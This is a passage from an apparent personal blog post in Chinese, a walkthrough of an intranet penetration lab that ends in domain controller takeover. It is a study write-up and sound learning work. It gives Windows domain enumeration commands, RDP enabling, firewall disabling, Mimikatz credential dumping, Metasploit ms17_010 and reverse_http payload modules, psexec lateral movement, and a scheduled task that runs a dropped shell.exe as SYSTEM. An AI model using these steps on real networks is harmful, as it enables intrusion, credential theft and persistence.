+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636601303-1faffeac-28a9-4362-8d4d-7450454ab9e1.png#averageHue=%231a1b1d&clientId=ub9e8dd7a-1ab9-4&from=paste&height=116&id=u89d1f1c3&originHeight=116&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6844&status=done&style=none&taskId=u26bd986f-4678-4c81-9c6c-f8ecb9b2e37&title=&width=505" alt="image.png"><br>使用ping 查看 域控的IP地址<br>IP地址为 : 192.168.52.138<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636656494-738d25d9-dc67-49bc-b718-b89815330775.png#averageHue=%231b1c1e&clientId=ub9e8dd7a-1ab9-4&from=paste&height=249&id=u87d0e3e7&originHeight=249&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22005&status=done&style=none&taskId=u6b20f48c-df8c-468e-96d6-8955a518d46&title=&width=668" alt="image.png"><br>基本信息收集命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ipconfig /all   # 查看本机ip，所在域<br>route print     # 打印路由信息<br>net view        # 查看局域网内其他主机名<br>arp -a          # 查看arp缓存<br>net start       # 查看开启了哪些服务<br>net share       # 查看开启了哪些共享<br>net share ipc$  # 开启ipc共享<br>net share c$    # 开启c盘共享<br>net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;    # 与192.168.xx.xx建立空连接<br>net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;    # 建立c盘共享<br>dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件<br><br>net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators    # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;doamin controllers&quot; /domain  # 查看域控制器（可能有多台）<br></code></pre></td></tr></table></figure>
+<p>添加一个用户test到管理员组 到后面好进行远程连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636907902-0e870dd0-95d5-45f2-9196-c8f794191dbd.png#averageHue=%2318191b&clientId=ub9e8dd7a-1ab9-4&from=paste&height=426&id=ufd3736c9&originHeight=426&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22694&status=done&style=none&taskId=u3a9b851a-22e1-4f49-9cf7-d8b672544b2&title=&width=690" alt="image.png"><br>查看是否开启3389 端口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683637119582-8ff34517-209e-4c9f-ab51-cfda923f5b2d.png#averageHue=%23191b1c&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1173&id=u3f796045&originHeight=1173&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114460&status=done&style=none&taskId=uded35469-48d6-41f8-821e-fe11637d6c3&title=&width=975" alt="image.png"><br>好像并没有开启3389 <br>使用这条命令开启3389 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure>
+<p>关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/manage/enable_rdp <br></code></pre></td></tr></table></figure>
+<p>rdesktop IP地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683637454654-51f49245-cf78-41ee-9cd3-3072b9afe186.png#averageHue=%231c4b63&clientId=ub9e8dd7a-1ab9-4&from=paste&height=631&id=u9d3c3008&originHeight=631&originWidth=1455&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177568&status=done&style=none&taskId=udd6c96f8-c99d-4254-a6a2-be245252784&title=&width=1455" alt="image.png"><br>远程也开启了 ，抓取一下密码<br>msf的hashdump 抓取失败了 还可以使用msf自带的模块进行抓取hansh</p>
+<blockquote>
+<p>meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</p>
+</blockquote>
+<p>上mimitakz<br>权限提升</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">privilege::debug<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683638034316-9cc8b218-3785-4ef4-887d-9523d0d4547d.png#averageHue=%231a1b1d&clientId=ub9e8dd7a-1ab9-4&from=paste&height=244&id=u00fbd5cb&originHeight=244&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19464&status=done&style=none&taskId=ua155a6c3-2211-4815-b36b-004cea20137&title=&width=724" alt="image.png"><br>抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683638157354-9ffaed84-d1a1-41cb-8ce8-843e945294f2.png#averageHue=%23191a1c&clientId=ub9e8dd7a-1ab9-4&from=paste&height=808&id=u656bdc69&originHeight=808&originWidth=757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56507&status=done&style=none&taskId=u55883719-98c7-42c2-a703-83ff52bf0f1&title=&width=757" alt="image.png"><br>获取到Administrator的密码了<br>这台机子算完成了<br>最后再查看内网有哪些机子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,255) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot; <br></code></pre></td></tr></table></figure>
+<p>由于这个很卡很慢不知道为啥，在这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use post/windows/gather/arp_scanner <br>set session 1<br>set rhosts 192.168.52.100-200<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683638927117-6c685c87-a2a4-4917-bd5a-1b935461d8d2.png#averageHue=%231f2022&clientId=ub9e8dd7a-1ab9-4&from=paste&height=92&id=u255d0934&originHeight=92&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20400&status=done&style=none&taskId=u741a6df5-4eb4-40c2-be31-fb154a846c8&title=&width=1235" alt="image.png"><br>查看到3个ip地址<br>138 我们已经知道是域控主机了 ，<br><a name="r5XCz"></a></p>
+<h1><span id="对141-主机下手-横向移动">对141 主机下手 （横向移动）</span></h1><p>对141 先进行探测<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683639049576-39e7bfe9-e804-4403-9410-7bc023cf872e.png#averageHue=%2318191b&clientId=ub9e8dd7a-1ab9-4&from=paste&height=246&id=u12cf0a01&originHeight=246&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13438&status=done&style=none&taskId=u7e25c233-5b3f-435b-ad36-3143d890816&title=&width=692" alt="image.png"><br>添加路由先<br><a name="y2hJT"></a></p>
+<h2><span id="socks代理">socks代理</span></h2><p>先添加socks代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use auxiliary/server/socks_proxy <br>set SRVHOST  127.0.0.1<br>set SRVPORT 8888<br>set VERSION  4a<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683642139204-26b0444e-dcec-4e0f-ba2d-85bc30bc4f56.png#averageHue=%23242732&clientId=ub9e8dd7a-1ab9-4&from=paste&height=163&id=ucbe6b5cb&originHeight=163&originWidth=672&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43426&status=done&style=none&taskId=u37e360de-b251-4c4b-9316-0cb32512cd8&title=&width=672" alt="image.png"><br>添加代理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683642168820-f72d67c2-0b94-4f89-9d58-31b8ffd8b39f.png#averageHue=%23242938&clientId=ub9e8dd7a-1ab9-4&from=paste&height=128&id=ub3364fe4&originHeight=128&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15281&status=done&style=none&taskId=uf7578392-6768-41b3-b2d1-d0c128256e6&title=&width=352" alt="image.png"><br>经过测试是可以正常返回内网的  ，一开始使用ping 进行 测试是否联通，但是没用，好像是不支持<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683642205256-ca21dee1-c2c1-4178-b4d6-6597038306d4.png#averageHue=%23262a37&clientId=ub9e8dd7a-1ab9-4&from=paste&height=324&id=u13ca4054&originHeight=324&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122673&status=done&style=none&taskId=ufde93bdb-3134-4bd7-b9ce-5de96ab2400&title=&width=692" alt="image.png"><br><a name="pK92q"></a></p>
+<h2><span id="假的-ms17_010">假的 ms17_010 ?</span></h2><p>探测是否存在 ms17_010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use auxiliary/scanner/smb/smb_ms17_010 <br>set rhost 192.168.52.141<br>run<br></code></pre></td></tr></table></figure>
+<p>但是这里一直卡 卡 卡 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683642907932-d08424ea-d393-422e-95eb-e86a372b7dea.png#averageHue=%23252834&clientId=ub9e8dd7a-1ab9-4&from=paste&height=98&id=udce526e5&originHeight=98&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48558&status=done&style=none&taskId=uaa41546c-2964-46cb-bca4-910661c9afe&title=&width=1001" alt="image.png"><br>扫描发现是存在受攻击的<br>但是使用攻击模块 一直不成功，发现超时还是其他另外有原因 （不清楚）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643231207-a093e230-4f19-4204-a7dc-9066a5fe3b22.png#averageHue=%23252934&clientId=ub9e8dd7a-1ab9-4&from=paste&height=578&id=u8bfc12d2&originHeight=578&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&size=329903&status=done&style=none&taskId=ue1a1e127-a4fc-4cd3-98a0-809be1733a2&title=&width=1069" alt="image.png"><br>扫描3389 端口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643262460-a2776282-1316-41d8-89b5-bbbe3f9f4ec6.png#averageHue=%23252934&clientId=ub9e8dd7a-1ab9-4&from=paste&height=227&id=u860db6f2&originHeight=227&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47259&status=done&style=none&taskId=u8aa0ba9d-a47e-49eb-beac-a0ff10fd2a0&title=&width=750" alt="image.png">发现关闭的<br>使用use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command  模块开启 3389 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643558846-77db6a28-71fb-47b9-a751-a36d9b35a1cf.png#averageHue=%23252934&clientId=ub9e8dd7a-1ab9-4&from=paste&height=519&id=u4a405d1b&originHeight=519&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=295136&status=done&style=none&taskId=uef02f5dd-20b4-43b2-943e-52f4feb7845&title=&width=1177" alt="image.png"> <br>这个模块是可以执行命令的<br>再次扫描 验证是否有效果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643530819-c32acb45-2a9d-4c6c-9634-8740d60140d6.png#averageHue=%23252833&clientId=ub9e8dd7a-1ab9-4&from=paste&height=289&id=u179698c9&originHeight=289&originWidth=754&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52001&status=done&style=none&taskId=u102d6536-2f5c-4c5d-91ee-29275073a81&title=&width=754" alt="image.png"><br>发现3389 开启了<br><a name="cBlQV"></a></p>
+<h2><span id="远程登录">远程登录</span></h2><p>添加一个test1 用户 然后添加到 管理员组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643634281-67e8761c-15e7-4315-89e8-88b5c3e6b794.png#averageHue=%23252834&clientId=ub9e8dd7a-1ab9-4&from=paste&height=77&id=u19a61b9b&originHeight=77&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29965&status=done&style=none&taskId=uf11349f6-88a7-45cc-ae47-757f3f35104&title=&width=836" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643712650-d094dfc4-520d-4201-9b33-da53a9b14c4f.png#averageHue=%23262b37&clientId=ub9e8dd7a-1ab9-4&from=paste&height=45&id=u946bdbb3&originHeight=45&originWidth=860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24029&status=done&style=none&taskId=u0633c65f-0445-4ed4-8bff-a063f2460a1&title=&width=860" alt="image.png"><br>远程连接看看是否成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxychains4 rdesktop 192.168.52.141<br><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683643776139-df5b2647-91d8-4736-abe8-54e490283da5.png#averageHue=%23505860&clientId=ub9e8dd7a-1ab9-4&from=paste&height=874&id=ua0a7fc4b&originHeight=874&originWidth=1241&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139276&status=done&style=none&taskId=u4c420361-8da1-485f-8d46-f5a11ab6bc0&title=&width=1241" alt="image.png"><br><a name="lkBf1"></a></p>
+<h2><span id="问题1">问题1</span></h2><p>在我想使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 弹shell 的时候弹不回来  测试不下20次 依旧反弹不了<br>这图是网上师傅的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683656684949-cf998b85-1c6b-4518-aa82-8b00b2123ac4.png#averageHue=%23050201&clientId=udb346b5b-06f8-4&from=paste&height=876&id=u9d8b320c&originHeight=876&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=716786&status=done&style=none&taskId=u9c98e0fe-7a2c-48ef-b415-093972f37a5&title=&width=1239" alt="image.png"><br>我测试过了 我这边不知道啥问题一直到最后一步就断开了  哎<br><a name="P4Cmb"></a></p>
+<h2><span id="msf派生cs">MSF派生CS</span></h2><p>既然上一种方法行不通 ，那就换一种方法<br>创建一个Lisenter，相当于msf的handler <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683650144393-be328be3-4936-4584-817f-f14c256f7bc9.png#averageHue=%23b0d3bf&clientId=ub9e8dd7a-1ab9-4&from=paste&height=602&id=u5f286f81&originHeight=602&originWidth=484&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34636&status=done&style=none&taskId=uf20d456e-67bf-4b86-942f-75df284a859&title=&width=484" alt="image.png"><br>使用MSF的exploit&#x2F;windows&#x2F;local&#x2F;payload_inject模块<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683650088605-cb66491d-c8e5-4b23-a2fc-f1354a051f7f.png#averageHue=%23262934&clientId=ub9e8dd7a-1ab9-4&from=paste&height=147&id=u2d8c3781&originHeight=147&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60435&status=done&style=none&taskId=uad38fcae-db31-46b7-a1ea-6fc19394457&title=&width=830" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/windows/local/payload_inject<br>set payload windows/meterpreter/reverse_http<br>set lport 1235 #需要同CS监听端口一致<br>set session 1 #需要传入的session<br>set DisablePayloadHandler true <br>run<br></code></pre></td></tr></table></figure>
+<p>上线<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683650375338-8895e828-796a-412a-a951-e9fb7e940b2d.png#averageHue=%23242220&clientId=ub9e8dd7a-1ab9-4&from=paste&height=901&id=u2a659d60&originHeight=901&originWidth=1289&originalType=binary&ratio=1&rotation=0&showTitle=false&size=311299&status=done&style=none&taskId=ua3a87430-5a7e-48b1-8a63-0f8d1520f90&title=&width=1289" alt="image.png"><br>就简单提权 getsystem 也可以或者使用插件CVE 提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683650648931-e2fa5d81-1bf7-42ce-8355-95ccafd4d1fb.png#averageHue=%23100e0d&clientId=ub9e8dd7a-1ab9-4&from=paste&height=968&id=u1bd838cd&originHeight=968&originWidth=1167&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72347&status=done&style=none&taskId=ubd55b313-32d4-4200-8844-92aa40c8262&title=&width=1167" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell netsh firewall show state  查询防火墙状态<br>shell netsh advfirewall set allprofiles state off  关闭防火墙<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683650860828-1066efe5-ae0d-4e56-8d01-71b28c1fe548.png#averageHue=%230c0b09&clientId=ub9e8dd7a-1ab9-4&from=paste&height=545&id=u9dc6bd3c&originHeight=545&originWidth=547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81255&status=done&style=none&taskId=uf7c4164d-4154-488b-b540-9aab947037e&title=&width=547" alt="image.png"><br>获取一些信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683651303841-089f2900-bba6-4a5c-af55-3667b4bf8a84.png#averageHue=%23050403&clientId=ub9e8dd7a-1ab9-4&from=paste&height=858&id=udc6da5da&originHeight=858&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74723&status=done&style=none&taskId=u01b1b77f-76db-4069-88b1-4130529d028&title=&width=1183" alt="image.png"><br><a name="dwDIV"></a></p>
+<h1><span id="域控">域控</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654047887-d0d9ab3a-dbf0-4979-968a-0637984115d2.png#averageHue=%23a5bed2&clientId=ub9e8dd7a-1ab9-4&from=paste&height=644&id=ua5ef82b0&originHeight=644&originWidth=486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16915&status=done&style=none&taskId=u8eadfd78-d7bb-4d10-a971-efe3a40f206&title=&width=486" alt="image.png"><br>创建一个 smb 的监听<br>点击目标 Target<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654129532-845c9542-626c-4264-9c03-83201e41d49f.png#averageHue=%23e2e8f1&clientId=ub9e8dd7a-1ab9-4&from=paste&height=568&id=u5006872d&originHeight=568&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36729&status=done&style=none&taskId=u2524f68e-633b-400f-918f-7ca66068f7e&title=&width=728" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654099642-fef4565e-0074-4fbc-9c0c-963dc4a06df1.png#averageHue=%23e8ecf3&clientId=ub9e8dd7a-1ab9-4&from=paste&height=981&id=u808e14da&originHeight=981&originWidth=2236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43657&status=done&style=none&taskId=u2f5ec585-4f0e-4c95-a39d-86626442b10&title=&width=2236" alt="image.png"><br>使用psexec<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654176406-e725dccb-ba6a-4882-8373-6f3afc9fa612.png#averageHue=%23dfe6ef&clientId=ub9e8dd7a-1ab9-4&from=paste&height=509&id=u6ec29381&originHeight=509&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39997&status=done&style=none&taskId=u164afd3f-40d3-4d4a-a33f-fde83e8e705&title=&width=933" alt="image.png"><br>选择刚才所创建的smb监听<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654258712-e3512813-617e-4107-90e9-4024ce4b9e41.png#averageHue=%23e7ecf4&clientId=ub9e8dd7a-1ab9-4&from=paste&height=704&id=ufe020bc5&originHeight=704&originWidth=1666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71338&status=done&style=none&taskId=udf9b04bf-6b96-49a0-ba4f-8600598565e&title=&width=1666" alt="image.png"><br>然后选择带有session 的 那个<br>这里是全部做完之后再接截图的，所以全部都已经获取了system权限<br>这样就可以拿下域控了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654408013-2f83ecf9-35a2-472e-8dc9-ecc5461be79a.png#averageHue=%230b0a0a&clientId=ub9e8dd7a-1ab9-4&from=paste&height=605&id=u05fe3c0b&originHeight=605&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59391&status=done&style=none&taskId=u0a1afd60-bb1b-40a1-8d45-ffed0e255a5&title=&width=1447" alt="image.png"><br>域成员也是如此的<br>全部拿下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654587649-eb3cbfef-0c20-45d6-82ef-3e3236417c75.png#averageHue=%23121110&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1368&id=ub7e4d62a&originHeight=1368&originWidth=1834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108639&status=done&style=none&taskId=u77ba76e2-f924-48c6-9280-2250e453f7c&title=&width=1834" alt="image.png"><br><a name="BYD7d"></a></p>
+<h1><span id="写任务计划拿域控">写任务计划拿域控</span></h1><p>通过win7在域控上面上传一个msf马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683654925933-77e811b7-6425-476e-91af-413e896f0629.png#averageHue=%23252831&clientId=ub9e8dd7a-1ab9-4&from=paste&height=234&id=u532510c1&originHeight=234&originWidth=696&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61638&status=done&style=none&taskId=ub57aa3ae-82c9-4e96-9f66-330f4d211ab&title=&width=696" alt="image.png"><br>存在文件共享的，我们也获取到了域控的密码，可以进行登录上传写计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net use \\192.168.52.138\c$ &quot;Admin@123&quot; /user:&quot;administrator&quot;<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683655068949-433bd4b2-943a-44a1-8c9b-59efc1fc97be.png#averageHue=%23272a35&clientId=ub9e8dd7a-1ab9-4&from=paste&height=126&id=u94c9108a&originHeight=126&originWidth=839&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39260&status=done&style=none&taskId=u7ff224c4-3e8e-4fb4-9347-c0d1fc6e08a&title=&width=839" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dir \\192.168.52.138\c$<br><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683655105031-e5d42e4d-e88d-4e30-9a78-ed3261373c33.png#averageHue=%23262934&clientId=ub9e8dd7a-1ab9-4&from=paste&height=322&id=ue5b32136&originHeight=322&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119943&status=done&style=none&taskId=u1e8fed03-eb31-4e62-9270-3ba6723b28d&title=&width=615" alt="image.png"><br>将一开始的那个shell 传到 域控上面去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy c:\phpstudy\www\yxcms\shell.exe \\192.168.52.138\c$<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683655198907-0ac44203-c1ee-40fc-b866-0cca3e5fd361.png#averageHue=%23252832&clientId=ub9e8dd7a-1ab9-4&from=paste&height=110&id=ua63865be&originHeight=110&originWidth=730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34707&status=done&style=none&taskId=u247879d7-d791-495d-93eb-0810405ce4e&title=&width=730" alt="image.png"><br>设置一个任务计划，定时启动木马之后就能够获取域控的shell了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell schtasks /create /tn &quot;test&quot; /tr C:\shell.exe /sc once /st 2:04 /S 192.168.52.138 /RU System  /u administrator /p &quot;Admin@123&quot;<br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">总结：<br>第一次打内网的靶场,也是才学习内网,下午两点开始搭建环境到展开打靶的过程<br>带现在2:27 结束 （下午吃饭，这些时间不算）也有好久了 感觉<br>不太明白的地方就问题1  我测试了不下20多次 任然错误，就最后一步断开连接 ，真头疼<br>然后自己不熟悉的地方 还有很多，比如代理，内网穿透啊 ，各种上线啊，等等<br>这些还不太熟悉，太菜了 ，打一天了<br></code></pre></td></tr></table></figure>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/12/Hacker_Kid/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Hacker_kid</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/04/25/%E4%B8%89%E5%B1%82%E9%9A%A7%E9%81%93/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      隧道
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
